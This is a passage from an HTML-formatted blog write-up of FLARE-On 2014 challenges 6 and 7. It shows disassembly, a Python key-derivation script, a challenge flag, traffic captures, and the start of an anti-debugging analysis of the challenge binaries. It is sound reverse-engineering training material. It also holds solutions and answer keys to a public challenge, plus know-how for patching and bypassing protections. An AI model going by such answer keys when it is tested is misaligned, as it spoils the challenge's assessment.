<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
<span class="line-number">6</span>
<span class="line-number">7</span>
</pre></td><td class="code"><pre><code class="nasm"><span class="line"><span class="nl">.text:</span><span class="err">00000000004371</span><span class="nf">C1</span> <span class="nv">mov</span>     <span class="nb">rax</span><span class="p">,</span> <span class="p">[</span><span class="nb">rbp</span><span class="o">+</span><span class="nv">arg1_2</span><span class="p">]</span> <span class="c1">; arg1 xor 0x56</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00000000004371</span><span class="nf">C8</span> <span class="nv">mov</span>     <span class="nb">edx</span><span class="p">,</span> <span class="mh">0Ah</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00000000004371</span><span class="nf">CD</span> <span class="nv">mov</span>     <span class="nb">esi</span><span class="p">,</span> <span class="nv">offset</span> <span class="nv">aBngcgDebd</span> <span class="c1">; &quot;bngcg`debd&quot;</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00000000004371</span><span class="nf">D2</span> <span class="nv">mov</span>     <span class="nb">rdi</span><span class="p">,</span> <span class="nb">rax</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00000000004371</span><span class="nf">D5</span> <span class="nv">call</span>    <span class="nv">sub_400370</span>       <span class="c1">; func(arg1 xor 0x56, hexlify(bngcg`debd) )</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00000000004371</span><span class="nf">DA</span> <span class="nv">test</span>    <span class="nb">eax</span><span class="p">,</span> <span class="nb">eax</span>         <span class="c1">; if function is successful, will return 0</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00000000004371</span><span class="nf">DC</span> <span class="nv">jz</span>      <span class="nv">short</span> <span class="nv">loc_4371F2</span> <span class="c1">; jumps if return value = 0</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>

<p>Application loads the string <code>bngcg`debd</code> and compares the result of <code>arg1 xor 0x56</code> with it. If both are equal, <code>jz</code> in line 7 will be taken.<br />
We have already seen the transitive property of xor so we can calculate the correct value of first argument which is <code>4815162342</code>. We could also patch the <code>jz</code> to <code>jmp</code> and enter any 10 characters for argument one.</p>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span>First argument </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
</pre></td><td class="code"><pre><code class="cpp"><span class="line"><span class="n">arg1</span> <span class="n">xor</span> <span class="mh">0x56</span> <span class="o">=</span> <span class="s">&quot;bngcg`debd&quot;</span>
</span><span class="line"><span class="n">arg1</span> <span class="o">=</span> <span class="s">&quot;bngcg`debd&quot;</span> <span class="n">xor</span> <span class="mh">0x56</span>
</span><span class="line"><span class="n">arg1</span> <span class="o">=</span> <span class="s">&quot;4815162342&quot;</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>

<p>Now it gets a bit hazy and very painful. There are tons of loops and function calls. Some random strings are loaded in different functions and not used for anything. I started to see patterns such as this instruction <code>mov  cs:byte_729AC2, al</code>. At that address, there are bytes being written and they are in <code>base64</code>. I was stepping through until suddenly everything stopped and I saw that a <code>nanosleep</code> syscall was executed.</p>

<p><img src="http://parsiya.net/images/2014/flare/6-2.jpg" alt="nanosleep" title="nanosleep" /></p>

<p>I patched it and continued. Application crashed a few times in between and I had to get back to my latest breakpoint. I got into the habit of copying the base64 bytes and setting up breakpoints every once in a while to get back to a checkpoint after each crash. Finally all the bytes were written and <a href="https://twitter.com/FireEye/status/496757071644487680">sub_401164</a> was called. This function decodes the bytes from base64 (although I though it is a different implementation and stepped through it for an hour before realizing that it is just a standard decoder).</p>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span>Checking argument 2 </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
<span class="line-number">6</span>
<span class="line-number">7</span>
<span class="line-number">8</span>
<span class="line-number">9</span>
<span class="line-number">10</span>
<span class="line-number">11</span>
<span class="line-number">12</span>
<span class="line-number">13</span>
<span class="line-number">14</span>
<span class="line-number">15</span>
<span class="line-number">16</span>
<span class="line-number">17</span>
<span class="line-number">18</span>
</pre></td><td class="code"><pre><code class="nasm"><span class="line"><span class="err">[</span><span class="nf">stack</span><span class="p">]:</span><span class="mi">00007</span><span class="nv">FFF3A5AC39C</span>  <span class="c1">; ---------------------------------------------------------------------------</span>
</span><span class="line">
</span><span class="line"><span class="err">[</span><span class="nf">stack</span><span class="p">]:</span><span class="mi">00007</span><span class="nv">FFF3A5AC39C</span>  <span class="nv">loc_7FFF3A5AC39C</span><span class="p">:</span>
</span><span class="line"><span class="err">[</span><span class="nf">stack</span><span class="p">]:</span><span class="mi">00007</span><span class="nv">FFF3A5AC39C</span>  <span class="nv">ror</span>     <span class="kt">byte</span> <span class="nv">ptr</span> <span class="p">[</span><span class="nb">rax</span><span class="p">],</span> <span class="mh">0F2h</span>            <span class="c1">; arg2[0] ror 0xF2 == 0x1B</span>
</span><span class="line"><span class="err">[</span><span class="nf">stack</span><span class="p">]:</span><span class="mi">00007</span><span class="nv">FFF3A5AC39F</span>  <span class="nv">cmp</span>     <span class="kt">byte</span> <span class="nv">ptr</span> <span class="p">[</span><span class="nb">rax</span><span class="p">],</span> <span class="mh">1Bh</span>
</span><span class="line"><span class="err">[</span><span class="nf">stack</span><span class="p">]:</span><span class="mi">00007</span><span class="nv">FFF3A5AC3A2</span>  <span class="nv">jz</span>      <span class="nv">short</span> <span class="nv">loc_7FFF3A5AC3A6</span>
</span><span class="line"><span class="err">[</span><span class="nf">stack</span><span class="p">]:</span><span class="mi">00007</span><span class="nv">FFF3A5AC3A4</span>  <span class="nv">jmp</span>     <span class="nb">rbx</span>
</span><span class="line"><span class="err">[</span><span class="nf">stack</span><span class="p">]:</span><span class="mi">00007</span><span class="nv">FFF3A5AC3A6</span>  <span class="c1">; ---------------------------------------------------------------------------</span>
</span><span class="line"><span class="err">[</span><span class="nf">stack</span><span class="p">]:</span><span class="mi">00007</span><span class="nv">FFF3A5AC3A6</span>
</span><span class="line"><span class="err">[</span><span class="nf">stack</span><span class="p">]:</span><span class="mi">00007</span><span class="nv">FFF3A5AC3A6</span>  <span class="nv">loc_7FFF3A5AC3A6</span><span class="p">:</span>
</span><span class="line"><span class="err">[</span><span class="nf">stack</span><span class="p">]:</span><span class="mi">00007</span><span class="nv">FFF3A5AC3A6</span>  <span class="nv">add</span>     <span class="nb">rax</span><span class="p">,</span> <span class="mi">1</span>
</span><span class="line"><span class="err">[</span><span class="nf">stack</span><span class="p">]:</span><span class="mi">00007</span><span class="nv">FFF3A5AC3AA</span>  <span class="nv">xor</span>     <span class="kt">byte</span> <span class="nv">ptr</span> <span class="p">[</span><span class="nb">rax</span><span class="p">],</span> <span class="mh">40h</span>             <span class="c1">; arg2[1] xor 0x40 xor 0xF2 xor 0xB3 == 0x30</span>
</span><span class="line"><span class="err">[</span><span class="nf">stack</span><span class="p">]:</span><span class="mi">00007</span><span class="nv">FFF3A5AC3AD</span>  <span class="nv">xor</span>     <span class="kt">byte</span> <span class="nv">ptr</span> <span class="p">[</span><span class="nb">rax</span><span class="p">],</span> <span class="mh">0F2h</span>
</span><span class="line"><span class="err">[</span><span class="nf">stack</span><span class="p">]:</span><span class="mi">00007</span><span class="nv">FFF3A5AC3B0</span>  <span class="nv">xor</span>     <span class="kt">byte</span> <span class="nv">ptr</span> <span class="p">[</span><span class="nb">rax</span><span class="p">],</span> <span class="mh">0B3h</span>
</span><span class="line"><span class="err">[</span><span class="nf">stack</span><span class="p">]:</span><span class="mi">00007</span><span class="nv">FFF3A5AC3B3</span>  <span class="nv">cmp</span>     <span class="kt">byte</span> <span class="nv">ptr</span> <span class="p">[</span><span class="nb">rax</span><span class="p">],</span> <span class="mh">30h</span>
</span><span class="line"><span class="err">[</span><span class="nf">stack</span><span class="p">]:</span><span class="mi">00007</span><span class="nv">FFF3A5AC3B6</span>  <span class="nv">jz</span>      <span class="nv">short</span> <span class="nv">loc_7FFF3A5AC3BA</span>
</span><span class="line"><span class="err">[</span><span class="nf">stack</span><span class="p">]:</span><span class="mi">00007</span><span class="nv">FFF3A5AC3B8</span>  <span class="nv">jmp</span>     <span class="nb">rbx</span>
</span><span class="line"><span class="nf">...</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>

<p>This is obviously shellcode, pushed to the stack and called. Bytes of the second argument are manipulated and then compared with some hardcoded value. I have only included the first 2 bytes here. For example <code>arg2[0] ror 0xF2 must equal 0x1B</code>, otherwise <code>jz</code> will be called and application will terminate in <code>loc_7FFF3A5AC3A6</code>. I saw around 30 checks meaning that argument 2 must be 30 bytes or so. I wrote the following Python code to calculate the second argument.</p>

<p>Python does not have <code>ror</code> and <code>rol</code> binary operators so I stole them from <a href="http://www.falatic.com/index.php/108/python-and-bitwise-rotation">here</a>. </p>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span>Second argument </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
<span class="line-number">6</span>
<span class="line-number">7</span>
<span class="line-number">8</span>
<span class="line-number">9</span>
<span class="line-number">10</span>
<span class="line-number">11</span>
<span class="line-number">12</span>
<span class="line-number">13</span>
<span class="line-number">14</span>
<span class="line-number">15</span>
<span class="line-number">16</span>
<span class="line-number">17</span>
<span class="line-number">18</span>
<span class="line-number">19</span>
<span class="line-number">20</span>
<span class="line-number">21</span>
<span class="line-number">22</span>
<span class="line-number">23</span>
<span class="line-number">24</span>
<span class="line-number">25</span>
<span class="line-number">26</span>
<span class="line-number">27</span>
<span class="line-number">28</span>
<span class="line-number">29</span>
<span class="line-number">30</span>
<span class="line-number">31</span>
<span class="line-number">32</span>
<span class="line-number">33</span>
<span class="line-number">34</span>
<span class="line-number">35</span>
<span class="line-number">36</span>
<span class="line-number">37</span>
<span class="line-number">38</span>
<span class="line-number">39</span>
<span class="line-number">40</span>
<span class="line-number">41</span>
<span class="line-number">42</span>
<span class="line-number">43</span>
<span class="line-number">44</span>
<span class="line-number">45</span>
<span class="line-number">46</span>
<span class="line-number">47</span>
<span class="line-number">48</span>
<span class="line-number">49</span>
<span class="line-number">50</span>
<span class="line-number">51</span>
<span class="line-number">52</span>
<span class="line-number">53</span>
<span class="line-number">54</span>
<span class="line-number">55</span>
<span class="line-number">56</span>
<span class="line-number">57</span>
<span class="line-number">58</span>
<span class="line-number">59</span>
<span class="line-number">60</span>
<span class="line-number">61</span>
<span class="line-number">62</span>
<span class="line-number">63</span>
<span class="line-number">64</span>
<span class="line-number">65</span>
<span class="line-number">66</span>
<span class="line-number">67</span>
<span class="line-number">68</span>
<span class="line-number">69</span>
<span class="line-number">70</span>
</pre></td><td class="code"><pre><code class="python"><span class="line"><span class="c"># rol and ror implementations taken from </span>
</span><span class="line"><span class="c"># http://www.falatic.com/index.php/108/python-and-bitwise-rotation</span>
</span><span class="line">
</span><span class="line"><span class="c"># Rotate left: 0b1001 --&gt; 0b0011</span>
</span><span class="line"><span class="n">rol</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">val</span><span class="p">,</span> <span class="n">r_bits</span><span class="p">,</span> <span class="n">max_bits</span><span class="o">=</span><span class="mi">8</span><span class="p">:</span> \
</span><span class="line">    <span class="p">(</span><span class="n">val</span> <span class="o">&lt;&lt;</span> <span class="n">r_bits</span><span class="o">%</span><span class="n">max_bits</span><span class="p">)</span> <span class="o">&amp;</span> <span class="p">(</span><span class="mi">2</span><span class="o">**</span><span class="n">max_bits</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="o">|</span> \
</span><span class="line">    <span class="p">((</span><span class="n">val</span> <span class="o">&amp;</span> <span class="p">(</span><span class="mi">2</span><span class="o">**</span><span class="n">max_bits</span><span class="o">-</span><span class="mi">1</span><span class="p">))</span> <span class="o">&gt;&gt;</span> <span class="p">(</span><span class="n">max_bits</span><span class="o">-</span><span class="p">(</span><span class="n">r_bits</span><span class="o">%</span><span class="n">max_bits</span><span class="p">)))</span>
</span><span class="line">
</span><span class="line"><span class="c"># Rotate right: 0b1001 --&gt; 0b1100</span>
</span><span class="line"><span class="n">ror</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">val</span><span class="p">,</span> <span class="n">r_bits</span><span class="p">,</span> <span class="n">max_bits</span><span class="o">=</span><span class="mi">8</span><span class="p">:</span> \
</span><span class="line">    <span class="p">((</span><span class="n">val</span> <span class="o">&amp;</span> <span class="p">(</span><span class="mi">2</span><span class="o">**</span><span class="n">max_bits</span><span class="o">-</span><span class="mi">1</span><span class="p">))</span> <span class="o">&gt;&gt;</span> <span class="n">r_bits</span><span class="o">%</span><span class="n">max_bits</span><span class="p">)</span> <span class="o">|</span> \
</span><span class="line">    <span class="p">(</span><span class="n">val</span> <span class="o">&lt;&lt;</span> <span class="p">(</span><span class="n">max_bits</span><span class="o">-</span><span class="p">(</span><span class="n">r_bits</span><span class="o">%</span><span class="n">max_bits</span><span class="p">))</span> <span class="o">&amp;</span> <span class="p">(</span><span class="mi">2</span><span class="o">**</span><span class="n">max_bits</span><span class="o">-</span><span class="mi">1</span><span class="p">))</span>
</span><span class="line">
</span><span class="line"><span class="n">arg2</span> <span class="o">=</span> <span class="p">[]</span>
</span><span class="line"><span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">32</span><span class="p">):</span>
</span><span class="line">    <span class="n">arg2</span><span class="o">.</span><span class="n">insert</span><span class="p">(</span><span class="n">x</span><span class="p">,</span> <span class="mi">90</span><span class="p">)</span>
</span><span class="line">
</span><span class="line"><span class="n">arg2</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="n">rol</span><span class="p">(</span><span class="mh">0x1B</span><span class="p">,</span><span class="mh">0xF2</span><span class="p">)</span>
</span><span class="line">
</span><span class="line"><span class="n">arg2</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="mh">0x40</span> <span class="o">^</span> <span class="mh">0xF2</span> <span class="o">^</span> <span class="mh">0xB3</span> <span class="o">^</span> <span class="mh">0x30</span><span class="p">)</span>
</span><span class="line">
</span><span class="line"><span class="n">arg2</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="mh">0x1F</span> <span class="o">^</span> <span class="mh">0x71</span><span class="p">)</span>
</span><span class="line">
</span><span class="line"><span class="n">arg2</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span>  <span class="n">rol</span><span class="p">(</span><span class="mh">0xB0</span> <span class="p">,</span> <span class="mh">0xBC</span><span class="p">)</span>  <span class="o">-</span> <span class="mh">0xA3</span>
</span><span class="line">
</span><span class="line"><span class="n">arg2</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">=</span>  <span class="p">(</span> <span class="mh">0xE8</span> <span class="o">+</span> <span class="mh">0x79</span> <span class="p">)</span>
</span><span class="line">
</span><span class="line"><span class="n">arg2</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span> <span class="o">=</span> <span class="n">rol</span><span class="p">(</span> <span class="mh">0xf6</span> <span class="o">+</span> <span class="mh">0x28</span> <span class="p">,</span> <span class="mh">0x82</span><span class="p">)</span>
</span><span class="line">
</span><span class="line"><span class="n">arg2</span><span class="p">[</span><span class="mi">6</span><span class="p">]</span> <span class="o">=</span> <span class="n">rol</span><span class="p">(</span> <span class="mh">0x1f</span> <span class="o">-</span> <span class="mh">0x2c</span><span class="p">,</span> <span class="mh">0x4d</span> <span class="p">)</span> <span class="o">+</span> <span class="mh">0xb0</span>
</span><span class="line">
</span><span class="line"><span class="n">arg2</span><span class="p">[</span><span class="mi">7</span><span class="p">]</span> <span class="o">=</span> <span class="n">ror</span><span class="p">(</span> <span class="n">rol</span><span class="p">(</span><span class="mh">0xAF</span> <span class="o">-</span> <span class="mh">0x3F</span> <span class="p">,</span> <span class="mh">0x2A</span><span class="p">)</span> <span class="o">^</span> <span class="mh">0xb8</span> <span class="p">,</span> <span class="mh">0x99</span> <span class="p">)</span> <span class="o">-</span> <span class="mh">0x54</span>
</span><span class="line">
</span><span class="line"><span class="n">arg2</span><span class="p">[</span><span class="mi">8</span><span class="p">]</span> <span class="o">=</span> <span class="n">rol</span><span class="p">(</span> <span class="mh">0x5D</span> <span class="p">,</span> <span class="mh">0xBA</span> <span class="p">)</span>
</span><span class="line">
</span><span class="line"><span class="n">arg2</span><span class="p">[</span><span class="mi">9</span><span class="p">]</span> <span class="o">=</span> <span class="n">rol</span><span class="p">(</span><span class="mh">0x29</span> <span class="o">-</span> <span class="mh">0x30</span><span class="p">,</span><span class="mh">0x6C</span><span class="p">)</span> <span class="o">^</span> <span class="mh">0xED</span>
</span><span class="line">
</span><span class="line"><span class="n">arg2</span><span class="p">[</span><span class="mi">10</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0xb5</span> <span class="o">+</span> <span class="mh">0xbf</span>
</span><span class="line">
</span><span class="line"><span class="n">arg2</span><span class="p">[</span><span class="mi">11</span><span class="p">]</span> <span class="o">=</span> <span class="n">ror</span><span class="p">(</span><span class="n">ror</span><span class="p">(</span><span class="mh">0xa5</span> <span class="o">-</span> <span class="mh">0x63</span> <span class="o">+</span> <span class="mh">0x31</span><span class="p">,</span><span class="mh">0x7b</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x8c</span> <span class="p">,</span> <span class="mh">0xbc</span><span class="p">)</span>
</span><span class="line">
</span><span class="line"><span class="n">arg2</span><span class="p">[</span><span class="mi">12</span><span class="p">]</span> <span class="o">=</span> <span class="n">ror</span> <span class="p">(</span> <span class="n">ror</span> <span class="p">(</span> <span class="n">ror</span> <span class="p">(</span> <span class="mh">0xf3</span> <span class="p">,</span> <span class="mh">0x98</span><span class="p">)</span> <span class="o">^</span> <span class="mh">0xAE</span><span class="p">,</span> <span class="mh">0x16</span><span class="p">)</span> <span class="p">,</span> <span class="mh">0x20</span><span class="p">)</span>
</span><span class="line">
</span><span class="line"><span class="n">arg2</span><span class="p">[</span><span class="mi">13</span><span class="p">]</span> <span class="o">=</span> <span class="n">rol</span> <span class="p">(</span> <span class="mh">0xa6</span> <span class="o">-</span> <span class="mh">0xD2</span>  <span class="p">,</span> <span class="mh">0x6E</span> <span class="p">)</span>
</span><span class="line">
</span><span class="line"><span class="n">arg2</span><span class="p">[</span><span class="mi">14</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x62</span> <span class="o">-</span> <span class="mh">0x34</span>
</span><span class="line">
</span><span class="line"><span class="n">arg2</span><span class="p">[</span><span class="mi">15</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="mh">0x32</span> <span class="o">^</span> <span class="mh">0xB2</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x62</span> <span class="o">+</span> <span class="mh">0x10</span> <span class="o">-</span> <span class="mh">0xCD</span>
</span><span class="line">
</span><span class="line"><span class="n">arg2</span><span class="p">[</span><span class="mi">16</span><span class="p">]</span> <span class="o">=</span> <span class="n">rol</span> <span class="p">(</span> <span class="mh">0xEB</span> <span class="p">,</span> <span class="mh">0x07</span><span class="p">)</span> <span class="o">^</span> <span class="mh">0x73</span> <span class="o">^</span> <span class="mh">0xB7</span>
</span><span class="line">
</span><span class="line"><span class="n">arg2</span><span class="p">[</span><span class="mi">17</span><span class="p">]</span> <span class="o">=</span> <span class="n">rol</span> <span class="p">(</span> <span class="mh">0x0B</span> <span class="o">+</span> <span class="mh">0x4C</span> <span class="o">-</span> <span class="mh">0x5B</span> <span class="p">,</span> <span class="mh">0x36</span> <span class="p">)</span> <span class="o">+</span> <span class="mh">0x61</span> <span class="o">-</span> <span class="mh">0x34</span>
</span><span class="line">
</span><span class="line"><span class="n">arg2</span><span class="p">[</span><span class="mi">18</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x9A</span> <span class="o">-</span> <span class="mh">0x5A</span>
</span><span class="line">
</span><span class="line"><span class="n">arg2</span><span class="p">[</span><span class="mi">19</span><span class="p">]</span> <span class="o">=</span> <span class="n">rol</span><span class="p">(</span><span class="mh">0x99</span><span class="p">,</span> <span class="mh">0xa2</span><span class="p">)</span>
</span><span class="line">
</span><span class="line"><span class="n">arg2</span><span class="p">[</span><span class="mi">20</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="mh">0x2B</span> <span class="o">+</span> <span class="mh">0xE7</span><span class="p">)</span> <span class="o">^</span> <span class="mh">0x7E</span>
</span><span class="line">
</span><span class="line"><span class="n">arg2</span><span class="p">[</span><span class="mi">21</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span> <span class="p">(</span> <span class="n">rol</span><span class="p">(</span> <span class="n">ror</span><span class="p">(</span><span class="mh">0xAF</span><span class="p">,</span><span class="mh">0x57</span><span class="p">)</span> <span class="p">,</span> <span class="mh">0x4A</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x4E</span> <span class="p">)</span> <span class="o">^</span> <span class="mh">0x86</span> <span class="p">)</span> <span class="o">+</span> <span class="mh">0xb8</span>
</span><span class="line">
</span><span class="line"><span class="c"># stopped after @fla</span>
</span><span class="line">
</span><span class="line"><span class="k">for</span> <span class="n">index</span><span class="p">,</span> <span class="n">item</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">arg2</span><span class="p">):</span>
</span><span class="line">    <span class="n">arg2</span><span class="p">[</span><span class="n">index</span><span class="p">]</span> <span class="o">=</span> <span class="n">item</span> <span class="o">&amp;</span> <span class="mh">0xFF</span>
</span><span class="line">
</span><span class="line"><span class="k">print</span> <span class="s">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="nb">map</span><span class="p">(</span><span class="nb">chr</span><span class="p">,</span> <span class="n">arg2</span><span class="p">))</span>
</span><span class="line">
</span><span class="line"><span class="c"># output</span>
</span><span class="line"><span class="n">l1nhax</span><span class="o">.</span><span class="n">hurt</span><span class="o">.</span><span class="n">u5</span><span class="o">.</span><span class="n">a1l</span><span class="nd">@flaZZZZZZZZZZ</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>

<p>Thanks <a href="https://twitter.com/Wartortell">@Wartortell</a>.</p>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span>Flag 6 </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
</pre></td><td class="code"><pre><code class=""><span class="line">l1nhax.hurt.u5.a1l@flare-on.com</span></code></pre></td></tr></table></div></figure></notextile></div>

<hr />

<h2 id="a-namech7a-challenge-7---the-doge-strikes-back"><a name="ch7"></a> Challenge 7 - The Doge Strikes Back</h2>

<div class="bogus-wrapper"><notextile><figure class="code"><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
</pre></td><td class="code"><pre><code class=""><span class="line">Alright! Last one, can you get to the finish line? Keep it up!
</span><span class="line">-FLARE</span></code></pre></td></tr></table></div></figure></notextile></div>

<p>By this time we have already fallen into a pre-check routine. Filename is <code>d69650fa6d4825ec2ddeecdc6a92228d</code> (MD5 hash) and googling brings up no notable results.</p>

<p>PE-Studio stuff:</p>

<ul>
  <li>Win32 executable</li>
  <li>VirusTotal score: 5/55</li>
  <li>Imported libraries: ws2_32.dll, kernel32.dll and wininet.dll. <code>wininet.dll</code> is for the interwebz</li>
  <li>Imported symbols: Lots of them. Functions for creating network sockets, hostname lookups, creating, reading and writing files and general anti-debug/anti-vm stuff</li>
  <li>Strings: Not as many strings as challenge 6. cmd.exe and 127.0.0.1 look interesting</li>
</ul>

<p>I used <code>API Monitor</code> to observe application’s API calls. It crashed after a while and API Monitor flagged 230k calls. Sifting through them is not practical but a lot of them are redundant and do not look interesting. For example there are a lot of <code>LocalAlloc</code> and <code>LocalFree</code> calls. Right click any call and select <code>Exclude &gt; API Name</code> to filter it. After excluding a lot of stuff, there was still so much crap. So instead I tried to look at API calls to certain Dlls for example <code>wininet.dll</code>. Under <code>Monitored Processes</code> navigate to <code>Modules</code> and then select a specific Dll to only see its calls. Let’s search for specific calls that we noticed in PE-Studio. API Monitor also supports searching in MSDN. Double click a call or right click and select <code>Online Help (MSDN)</code>.</p>

<p>I searched for <a href="http://msdn.microsoft.com/en-us/library/windows/desktop/ms738524%28v=vs.85%29.aspx">gethostbyname</a> and found some interesting results:</p>

<p><img src="http://parsiya.net/images/2014/flare/7-1.jpg" alt="Dogecoin" title="Dogecoin" /></p>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span>Calls for gethostbyname </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
</pre></td><td class="code"><pre><code class=""><span class="line">gethostbyname ( "www.dogecoin.com" )
</span><span class="line">gethostbyname ( "e.root-servers.net" )</span></code></pre></td></tr></table></div></figure></notextile></div>

<p>I was curious about these connections so I captured the traffic using <code>Wireshark</code> from launch to crash. </p>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span>Traffic summary - some lines omitted </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
<span class="line-number">6</span>
<span class="line-number">7</span>
<span class="line-number">8</span>
<span class="line-number">9</span>
<span class="line-number">10</span>
<span class="line-number">11</span>
<span class="line-number">12</span>
<span class="line-number">13</span>
<span class="line-number">14</span>
</pre></td><td class="code"><pre><code class=""><span class="line">10.0.2.15	192.168.1.1	DNS	76	Standard query 0xbbc7  A www.dogecoin.com
</span><span class="line">192.168.1.1	10.0.2.15	DNS	106	Standard query response 0xbbc7  CNAME dogecoin.com A 204.232.175.78
</span><span class="line">10.0.2.15	192.168.1.1	DNS	78	Standard query 0xa75d  A e.root-servers.net
</span><span class="line">192.168.1.1	10.0.2.15	DNS	94	Standard query response 0xa75d  A 192.203.230.10
</span><span class="line">10.0.2.15	192.168.1.1	DNS	71	Standard query 0x7524  A twitter.com
</span><span class="line">192.168.1.1	10.0.2.15	DNS	135	Standard query response 0x7524  A 199.16.156.198 A 199.16.156.70 A 199.16.156.6 A 199.16.156.102
</span><span class="line">10.0.2.15	199.16.156.198	TLSv1	124	Client Hello
</span><span class="line">199.16.156.198	10.0.2.15	TLSv1	1474	Server Hello
</span><span class="line">199.16.156.198	10.0.2.15	TLSv1	382	Certificate
</span><span class="line">10.0.2.15	199.16.156.198	TLSv1	368	Client Key Exchange, Change Cipher Spec, Encrypted Handshake Message
</span><span class="line">199.16.156.198	10.0.2.15	TLSv1	101	Change Cipher Spec, Encrypted Handshake Message
</span><span class="line">10.0.2.15	199.16.156.198	TLSv1	260	Application Data
</span><span class="line">199.16.156.198	10.0.2.15	TLSv1	1431	Application Data
</span><span class="line">199.16.156.198	10.0.2.15	TLSv1	1474	Application Data</span></code></pre></td></tr></table></div></figure></notextile></div>

<p>Query for <code>www.dogecoin.com</code>, <code>e.root-servers.net</code> and <code>www.twitter.com</code>. Then TLS handshake in lines 7-11 and finally a request to twitter (line 12) and reply (lines 13-14). Let’s search for “twitter” in API Monitor and we see this <code>InternetOpenUrlW ( 0x00cc0004, "https://twitter.com/FireEye/status/484033515538116608", NULL, 0, INTERNET_FLAG_KEEP_CONNECTION | INTERNET_FLAG_PRAGMA_NOCACHE, 0 )</code>. Let’s find that tweet and it looks normal.</p>

<p><img src="http://parsiya.net/images/2014/flare/7-2.jpg" alt="When embed tweet plugins for Octopress don't work" title="When embed tweet plugins for Octopress don't work" /></p>

<p>Because this challenge employs a good number of Anti-Debug/Anti-VM protections, I will try to explain what I learned at each stage. Even after finishing the challenge I went back and looked at some steps again to learn more.</p>

<p>Here are some useful resources:</p>

<ul>
  <li>
    <p><a href="http://pferrie.host22.com/papers/antidebug.pdf">The “Ultimate” Anti-Debugging Reference (PDF)</a> by <code>Peter Ferrie</code>. I had to remind myself what year it was after I visited <a href="http://pferrie.host22.com/">his website</a></p>
  </li>
  <li>
    <p><a href="http://practicalmalwareanalysis.com/">Practical Malware Analysis book</a> chapters 16 and 17 deal with Anti-Debugging and Anti-VM techniques</p>
  </li>
  <li>
    <p><a href="https://blog.malwarebytes.org/intelligence/2014/09/five-anti-debugging-tricks-that-sometimes-fool-analysts/">Five Anti-Analysis Tricks That Sometimes Fool Analysts</a> was published when I was writing this post</p>
  </li>
</ul>

<p>Find <code>main</code> and put a breakpoint on it. As we go through main we reach a bunch of function calls. Let’s start with the first one.</p>

<h4 id="function-1---isdebuggerpresent">Function 1 - isDebuggerPresent?</h4>

<div class="bogus-wrapper"><notextile><figure class="code"><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
<span class="line-number">6</span>
<span class="line-number">7</span>
<span class="line-number">8</span>
<span class="line-number">9</span>
<span class="line-number">10</span>
<span class="line-number">11</span>
<span class="line-number">12</span>
</pre></td><td class="code"><pre><code class="nasm"><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B13</span> <span class="nv">call</span>    <span class="nv">sub_401030</span>   <span class="c1">; you are here</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B18</span> <span class="nv">call</span>    <span class="nv">sub_4010C0</span>
